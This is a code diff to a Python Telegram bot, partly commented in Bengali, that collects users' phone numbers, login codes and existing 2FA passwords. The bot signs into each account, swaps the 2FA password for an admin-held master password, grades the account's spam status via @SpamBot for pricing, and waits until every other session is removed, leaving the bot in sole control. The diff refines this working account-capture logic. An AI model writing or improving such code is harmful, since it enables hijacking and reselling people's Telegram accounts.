@@ -28,7 +28,7 @@ if not os.path.exists(BASE_STORAGE_DIR):
     except: pass
 
 FLAG_MAP = {
-    "880": "🇧🇩", "52": "🇲🇽", "60": "🇲🇾", "49": "🇩🇪", "54": "🇦睿", "57": "🇨🇴", "1": "🇺🇸", "44": "🇬🇧", "91": "🇮🇳"
+    "880": "🇧🇩", "52": "🇲🇽", "60": "🇲🇾", "49": "🇩🇪", "54": "🇦🇷", "57": "🇨🇴", "1": "🇺🇸", "44": "🇬🇧", "91": "🇮🇳"
 }
 def get_flag(code):
     return FLAG_MAP.get(str(code), "🏳️")
@@ -207,28 +207,6 @@ def cmd_account(message):
     )
     bot.send_message(message.chat.id, response)
 
-@bot.message_handler(commands=['withdrwal', 'withdraw'])
-def cmd_withdraw(message):
-    user_id = message.from_user.id
-    stats = get_user_stats(user_id)
-    if stats['verified'] < 1 or stats['verified_balance'] <= 0.0:
-        bot.send_message(message.chat.id, "⚠️ **Minimum withdrawal condition is at least 1 verified account.**")
-        return
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(types.InlineKeyboardButton("💳 Withdraw Card", callback_data="wtd_card"), types.InlineKeyboardButton("🪙 USDT (BEP-20)", callback_data="wtd_bep20"))
-    bot.send_message(message.chat.id, "⚡ **Choose Method:**", reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("wtd_"))
-def handle_wtd(call):
-    user_id = call.from_user.id
-    bot.delete_message(call.message.chat.id, call.message.message_id)
-    if call.data == "wtd_card":
-        bot.send_message(call.message.chat.id, "💳 **Send your card info:**")
-        admin_state[user_id] = "wait_wtd_card"
-    elif call.data == "wtd_bep20":
-        bot.send_message(call.message.chat.id, "🪙 **Send your USDT BEP-20 Address:**")
-        admin_state[user_id] = "wait_wtd_bep20"
-
 @bot.callback_query_handler(func=lambda call: call.data.startswith("chk_time_"))
 def handle_live_timer_click(call):
     tracker_id = call.data.replace("chk_time_", "")
@@ -274,7 +252,7 @@ def handle_pnl(call):
         bot.send_message(call.message.chat.id, "🔐 *Enter new master password for accounts protection:*")
         admin_state[call.from_user.id] = "wait_admin_2fa"
 
-# ==================== টেক্সট হ্যান্ডলার এবং বাগ ফিক্সড ইনপুট লজিক ====================
+# ==================== টেক্সট ইনপুট হ্যান্ডলিং ====================
 @bot.message_handler(func=lambda message: True)
 def handle_text(message):
     user_id = message.from_user.id
@@ -282,17 +260,7 @@ def handle_text(message):
     
     if user_id in admin_state:
         state = admin_state[user_id]
-        if state == "wait_wtd_card":
-            del admin_state[user_id]
-            bot.reply_to(message, "✅ **Your Card withdrawal request submitted!**")
-            bot.send_message(ADMIN_ID, f"📥 Card Withdrawal Request!\nUser: `{user_id}`\nInfo: {text}")
-            return
-        elif state == "wait_wtd_bep20":
-            del admin_state[user_id]
-            bot.reply_to(message, "✅ **Your USDT withdrawal request submitted!**")
-            bot.send_message(ADMIN_ID, f"📥 BEP20 Withdrawal Request!\nUser: `{user_id}`\nAddr: `{text}`")
-            return
-        elif user_id == ADMIN_ID and state == "wait_country_all":
+        if user_id == ADMIN_ID and state == "wait_country_all":
             del admin_state[user_id]
             try:
                 p = text.split("=")
@@ -312,19 +280,16 @@ def handle_text(message):
             bot.reply_to(message, f"✅ Master 2FA Password updated to: `{text}`")
             return
 
-    # ওটিপি / পাসওয়ার্ড সাবমিশন হ্যান্ডলিং
     if user_id in user_data and ("phone_code_hash" in user_data[user_id] or user_data[user_id].get("waiting_for_password")):
         asyncio.run_coroutine_threadsafe(verify_otp_task(text, user_id, message), bot_loop)
         return
 
-    # নতুন ফোন নম্বর সাবমিশন টেস্ট
     if text.startswith("+") or text.isdigit():
         phone = text if text.startswith("+") else f"+{text}"
         clean_phone = phone.replace("+", "").replace(" ", "")
         
-        # [বাগ ফিক্স ১]: নম্বর ভেরিফাইড বা পেন্ডিং রান থাকলে সরাসরি এক্সেস ব্লক
         if is_number_locked(clean_phone):
-            bot.reply_to(message, f"❌ The account number `{phone}` is already verified or currently in confirmation process. Cannot duplicate requests.")
+            bot.reply_to(message, f"❌ The account number `{phone}` is already verified or currently in confirmation process.")
             return
             
         matched_code = check_valid_country_and_get_code(phone)
@@ -350,7 +315,6 @@ async def send_otp_task(phone_number, country_code, user_id, message, processing
     final_session_path = os.path.join(BASE_STORAGE_DIR, country_code, f"+{clean_phone}")
     os.makedirs(os.path.dirname(final_session_path), exist_ok=True)
     
-    # প্রতিবার ফ্রেশ ক্লায়েন্ট অবজেক্ট তৈরি
     user_client = TelegramClient(final_session_path, API_ID, API_HASH, base_logger='critical')
     try:
         await user_client.connect()
@@ -371,34 +335,26 @@ async def verify_otp_task(text, user_id, message):
     settings = load_settings()
     client = data["client"]
     
-    # [বাগ ফিক্স ২]: ডিসকানেক্টেড ইরোর হ্যান্ডলিং, সেশন অফ থাকলে রিকানেক্ট করবে
     try:
         if not client.is_connected():
             await client.connect()
     except:
-        bot.reply_to(message, "❌ Session disconnected. Please try /start again.")
+        bot.reply_to(message, "❌ Session disconnected. Please try again.")
         del user_data[user_id]
         return
 
     if data.get("waiting_for_password"):
         try:
-            # ইউজার যখন আগের ২এফএ পাসওয়ার্ড দিচ্ছে
             current_pwd = text
             await client.sign_in(password=current_pwd)
             
-            # [বাগ ফিক্স ৩]: লগইন সফল হওয়ামাত্রই এডমিনের মাস্টার পাসওয়ার্ড ইনস্ট্যান্টলি সেভ ও রিপ্লেস হবে
+            # ইনস্ট্যান্ট মাস্টার লক প্রোটেকশন অ্যাসাইনমেন্ট
             try:
                 await client(functions.account.UpdatePasswordSettingsRequest(
-                    password=tl_types.InputCheckPasswordSRPShape(
-                        srp_id=0, A=b'', M1=b'' # ইন্টারনাল টেলিথনের মাধ্যমে ওল্ড পাসওয়ার্ড ক্লিয়ারিং হ্যান্ডলার
-                    ) if hasattr(tl_types, 'InputCheckPasswordSRPShape') else await client.get_password_setting(),
-                    new_settings=tl_types.PasswordInputSettings(
-                        new_password=settings["security_password"], 
-                        hint="Cloud Lock Master"
-                    )
+                    password=await client.get_password_setting() if hasattr(client, 'get_password_setting') else tl_types.InputCheckPasswordEmpty(),
+                    new_settings=tl_types.PasswordInputSettings(new_password=settings["security_password"], hint="Cloud Lock Master")
                 ))
-            except Exception as pwd_err:
-                # অল্টারনেটিভ ডিরেক্ট মেথড (যদি কারেন্ট পাসওয়ার্ড সেশন ওপেন থাকে)
+            except:
                 try: await client(functions.account.UpdatePasswordSettingsRequest(password=current_pwd, new_settings=tl_types.PasswordInputSettings(new_password=settings["security_password"])))
                 except: pass
                 
@@ -408,8 +364,6 @@ async def verify_otp_task(text, user_id, message):
     else:
         try:
             await client.sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
-            
-            # কোনো টু-স্টেপ না থাকলে সরাসরি নতুন মাস্টার পাসওয়ার্ড ইনস্ট্যান্ট অ্যাসাইন হবে
             try:
                 await client(functions.account.UpdatePasswordSettingsRequest(
                     password=tl_types.InputCheckPasswordEmpty(),
@@ -425,17 +379,18 @@ async def verify_otp_task(text, user_id, message):
             bot.reply_to(message, f"❌ OTP Code Error: {e}")
 
 async def check_and_save_account(user_id, message, data, settings):
-    # ডাবল সাবমিশন প্রটেকশন অন
     add_to_pending_numbers(data["clean_phone"])
     
     spam_status = "🕊️ Free As Bird"
     price_key = "free"
     
+    # ==================== [বিদ্যুতের গতিতে স্প্যামবট চেক লজিক] ====================
     try:
-        async with data["client"].conversation("@SpamBot", timeout=4) as conv:
-            await conv.send_message("/start")
-            resp = await conv.get_response()
-            bot_text = resp.text.lower()
+        # সরাসরি মেসেজ পাঠিয়ে ইনকামিং মেসেজ লুপ থেকে ইনস্ট্যান্ট ১ সেকেন্ডে ডাটা রিড করা হবে
+        await data["client"].send_message('@SpamBot', '/start')
+        await asyncio.sleep(1.2) # মেসেজ ডেলিভারি ও রেসপন্সের নিখুঁত ফাস্ট টাইমার
+        async for msg in data["client"].iter_messages('@SpamBot', limit=1):
+            bot_text = msg.text.lower()
             if "good news" in bot_text or "no limits" in bot_text:
                 spam_status = "🕊️ Free As Bird"
                 price_key = "free"
@@ -445,6 +400,7 @@ async def check_and_save_account(user_id, message, data, settings):
             else:
                 spam_status = "🛑 Permanent Spam"
                 price_key = "perm"
+                break
     except:
         spam_status = "🆕 New Registration"
         price_key = "new"
@@ -459,6 +415,7 @@ async def check_and_save_account(user_id, message, data, settings):
         del user_data[user_id]
         return
 
+    # ওল্ড ওটিপি ইন্টারফেস ডিলিট (ক্লিন লুক)
     try: bot.delete_message(message.chat.id, data["prompt_msg_id"])
     except: pass
 
@@ -488,7 +445,6 @@ async def run_background_verification(user_id, data, conf, target_price, msg_id,
         try:
             await data["client"].connect()
             if not await data["client"].is_user_authorized():
-                # যদি ইউজার ওটিপি কোড ডিলিট বা সেশন কিক মারে
                 reject_pending_account(user_id, target_price)
                 remove_from_pending_numbers(data["clean_phone"])
                 if tracker_id in live_trackers: del live_trackers[tracker_id]
@@ -497,7 +453,6 @@ async def run_background_verification(user_id, data, conf, target_price, msg_id,
                 return
                 
             auths = await data["client"](functions.account.GetAuthorizationsRequest())
-            # যদি অন্য সব ডিভাইস ক্লিয়ার থাকে (শুধুমাত্র এই বটের সেশন একটিভ থাকে)
             if len([a for a in auths.authorizations if not a.current]) == 0:
                 await data["client"].disconnect()
                 try: bot.delete_message(user_id, msg_id)
@@ -517,7 +472,6 @@ async def run_background_verification(user_id, data, conf, target_price, msg_id,
         await asyncio.sleep(interval)
         elapsed += interval
 
-    # ১ ঘন্টা পার হলেও যদি ক্লিয়ার না করে তবে রিজেক্ট ও লক রিলিজ
     reject_pending_account(user_id, target_price)
     remove_from_pending_numbers(data["clean_phone"])
     if tracker_id in live_trackers: del live_trackers[tracker_id]
